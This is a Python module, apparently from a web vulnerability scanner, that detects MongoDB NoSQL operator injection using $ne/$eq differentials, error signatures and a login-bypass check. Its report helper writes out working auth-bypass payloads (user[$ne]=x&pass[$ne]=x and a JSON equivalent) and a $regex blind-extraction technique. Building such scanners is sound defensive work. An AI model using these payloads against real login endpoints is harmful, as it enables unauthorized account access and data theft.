from __future__ import annotations
from huntnyx.core.common import *  # noqa: F401,F403
import difflib

# ════════════════════════════════════════════════════════════════════════
#  NoSQL INJECTION  (MongoDB / Mongoose operator injection)
#
#  Two INDEPENDENT confirmation classes, so a CONFIRMED verdict is honest:
#
#    nosqli.diff  (PROOF)  operator DIFFERENTIAL. Two logically opposite
#                          operators with a RANDOM canary:
#                              always-true   param[$ne]=<canary>  (match-all)
#                              always-false  param[$eq]=<canary>  (match-none)
#                          If evaluated, match-all vs match-none diverge and
#                          match-all differs from a normal literal lookup. A
#                          random canary cannot match by accident, so a
#                          sanitising/reflecting app shows NO difference.
#                          Confirmed over TWO fresh canary rounds.
#
#    nosqli.error (STRONG) a malformed operator surfaces a MongoDB/Mongoose
#                          parser error absent from the baseline. Deterministic.
#
#  diff + error → two classes → CONFIRMED.  Either alone → TENTATIVE/INFO.
#
#  LOGIN-AWARE MODE
#    Single-param testing can't catch the classic auth bypass, which needs an
#    operator in BOTH credential fields at once (user[$ne]=x & pass[$ne]=x).
#    When an injection point carries a password-like field alongside another
#    credential field, we run ONE extra differential that puts match-all ($ne)
#    on ALL credential fields simultaneously and compares to a benign (failing)
#    baseline. It runs exactly once per endpoint — gated on the password field —
#    and its signal shares the nosqli.diff class (it is the same differential
#    oracle, so we do NOT invent a fake second class to force CONFIRMED). A
#    login bypass therefore reads CONFIRMED when the error class co-fires, and
#    TENTATIVE (flagged for manual check) on its own.
#
#  False-positive guards (all modes):
#    • BASELINE STABILITY — same benign value sent twice; if the two responses
#      already differ, the endpoint is noisy → ABORT, no verdict.
#    • RESPONSE NORMALISATION — digits and long hex/token blobs stripped before
#      comparison.
#    • TWO CANARY ROUNDS — the differential must reproduce with fresh canaries.
#    • MATCH-NONE ≈ BASELINE — the always-false response must look like a normal
#      miss; this is what blocks reflecting apps from firing.
#    • NO TIME-BASED CLASS — timing is excluded from confirmation.
#
#  Format-aware: JSON-body endpoints get nested operator objects
#  {"param": {"$ne": "<canary>"}}; everything else uses bracket notation.
# ════════════════════════════════════════════════════════════════════════


_SIM = 0.97                       # SequenceMatcher ratio ≥ this ⇒ "same" response
_VOLATILE = re.compile(r"[0-9a-f]{16,}|\d+")

_PW_RE = re.compile(r"pass|pwd|passwd", re.I)
_USER_RE = re.compile(r"user|email|login|uname|account|mail|phone|msisdn", re.I)

_ERR_SIGNATURES = (
    "mongoerror", "mongoservererror", "bsonerror", "mongoose", "casterror",
    "e11000", "failed to parse", "unterminated", "unexpected token",
    "unexpected end of json", "topology was destroyed", "must be an array",
    "needs an array", "unknown operator", "$in requires an array",
    "cannot read properties of undefined",
)


def _norm(text):
    t = (text or "")[:4000].lower()
    t = _VOLATILE.sub("", t)
    return re.sub(r"\s+", " ", t).strip()


def _sig(resp):
    return (resp.status, _norm(resp.text))


def _same(a, b):
    if a[0] != b[0]:
        return False
    return difflib.SequenceMatcher(None, a[1], b[1]).ratio() >= _SIM


def _password_field(params):
    return next((k for k in params if _PW_RE.search(k)), None)


def _cred_fields(params):
    return [k for k in params if _PW_RE.search(k) or _USER_RE.search(k)]


class NoSQLInjectionModule(_Module):
    name = vuln = "nosqli"

    def requires(self, ip):
        return ip.dynamic and not ip.body_is_xml

    # --- request builders ---------------------------------------------------
    def _is_json(self, ip):
        return "json" in (ip.content_type or "").lower() and ip.method.upper() != "GET"

    def _send_map(self, http, ip, spec, *, cache=False):
        """spec: field -> ('op', opname, val) | ('lit', val); absent → original."""
        if self._is_json(ip):
            obj = {}
            for k, v in ip.params.items():
                s = spec.get(k)
                if s is None:
                    obj[k] = v
                elif s[0] == "op":
                    obj[k] = {s[1]: s[2]}
                else:
                    obj[k] = s[2]
            return http.post(ip.url, body=json.dumps(obj),
                             headers={"Content-Type": "application/json"},
                             cache=cache, follow=False)
        pairs = []
        for k, v in ip.params.items():
            s = spec.get(k)
            if s is None:
                pairs.append((k, v))
            elif s[0] == "op":
                pairs.append((f"{k}[{s[1]}]", s[2]))
            else:
                pairs.append((k, s[2]))
        qs = urlencode(pairs)
        if ip.method.upper() == "GET":
            sp = urlsplit(ip.url)
            return http.get(urlunsplit((sp.scheme, sp.netloc, sp.path, qs, "")),
                            cache=cache, follow=False)
        return http.post(ip.url, body=qs,
                         headers={"Content-Type": "application/x-www-form-urlencoded"},
                         cache=cache, follow=False)

    def _send_op(self, http, ip, op, val, *, cache=False):
        return self._send_map(http, ip, {ip.param: ("op", op, val)}, cache=cache)

    def _send_lit(self, http, ip, val, *, cache=False):
        return self._send_map(http, ip, {ip.param: ("lit", val)}, cache=cache)

    # --- probe --------------------------------------------------------------
    def probe(self, http, ip):
        if not self.requires(ip):
            return []
        sigs = []

        if self._differential(http, ip):
            sigs.append(Signal(
                self.vuln, "operator-differential[$ne vs $eq]", "nosqli.diff",
                SignalStrength.PROOF,
                "match-all ($ne) vs match-none ($eq) diverged over 2 canary rounds "
                "on a stable baseline",
                {"param": ip.param}))

        err = self._error(http, ip)
        if err:
            sigs.append(Signal(
                self.vuln, f"operator-error[{err}]", "nosqli.error",
                SignalStrength.STRONG,
                f"database parser error surfaced on a malformed operator ({err})",
                {"param": ip.param}))

        # login-aware all-fields bypass — run once per endpoint (on the pw field)
        pw = _password_field(ip.params)
        creds = _cred_fields(ip.params)
        if pw and len(creds) >= 2 and ip.param == pw and self._login_bypass(http, ip, creds):
            sigs.append(Signal(
                self.vuln, "login-operator-bypass[$ne all credential fields]",
                "nosqli.diff", SignalStrength.PROOF,
                "match-all ($ne) on all credential fields succeeded against a "
                "failing benign baseline (auth bypass), 2 canary rounds",
                {"param": "+".join(creds)}))

        if self._debug:
            has = lambda c: "Y" if any(s.independence == c for s in sigs) else "-"
            UI.dim(f"      [nosqli] {ip.method} {ip.url} [{ip.param}] "
                   f"diff={has('nosqli.diff')} err={has('nosqli.error')}")
        return sigs

    # --- class 1: single-param differential (PROOF) ------------------------
    def _differential(self, http, ip):
        b1 = _sig(_send_with(http, ip, "hnyx" + _rand(8), cache=False))
        b2 = _sig(_send_with(http, ip, "hnyx" + _rand(8), cache=False))
        if not _same(b1, b2):
            return False
        baseline = b1

        def round_ok():
            canary = "hnyx" + _rand(10)
            t = _sig(self._send_op(http, ip, "$ne", canary))
            f = _sig(self._send_op(http, ip, "$eq", canary))
            return (not _same(t, f)) and (not _same(t, baseline)) and _same(f, baseline)

        return round_ok() and round_ok()

    # --- login-aware: operators on ALL credential fields at once (PROOF) ---
    def _login_bypass(self, http, ip, creds):
        def benign():
            return {k: ("lit", "hnyx" + _rand(8)) for k in creds}
        b1 = _sig(self._send_map(http, ip, benign(), cache=False))
        b2 = _sig(self._send_map(http, ip, benign(), cache=False))
        if not _same(b1, b2):
            return False
        baseline = b1

        def round_ok():
            canary = "hnyx" + _rand(10)
            all_ne = {k: ("op", "$ne", canary) for k in creds}
            all_eq = {k: ("op", "$eq", canary) for k in creds}
            t = _sig(self._send_map(http, ip, all_ne))   # match every account
            f = _sig(self._send_map(http, ip, all_eq))   # match none
            return (not _same(t, f)) and (not _same(t, baseline)) and _same(f, baseline)

        return round_ok() and round_ok()

    # --- class 2: error-based (STRONG) -------------------------------------
    def _error(self, http, ip):
        base = (_send_with(http, ip, "hnyx" + _rand(8), cache=False).text or "").lower()
        probes = (("$regex", "("), ("$in", "hnyx" + _rand(6)), ("$gt", "["))
        for op, val in probes:
            try:
                low = (self._send_op(http, ip, op, val).text or "").lower()
            except Exception:
                continue
            for m in _ERR_SIGNATURES:
                if m in low and m not in base:
                    return m
        return None


def phase_nosqli(target, config, runner):
    return _vuln_phase(target, config, runner, "nosqli")


def _nosqli_exploit_lines(techniques):
    return [
        "impact : authentication bypass / data exfiltration via operator injection",
        "verify : login with  user[$ne]=x&pass[$ne]=x  (urlencoded), or JSON body",
        '         {"user":{"$ne":null},"pass":{"$ne":null}}  — authorized testing only',
        "extract: blind boolean per-char via  field[$regex]=^a  and narrow down",
    ]


def _r_nosqli(d):
    return _r_injection("NoSQL INJECTION", d, exploit=_nosqli_exploit_lines)


INJECTION_MODULES.append(NoSQLInjectionModule)
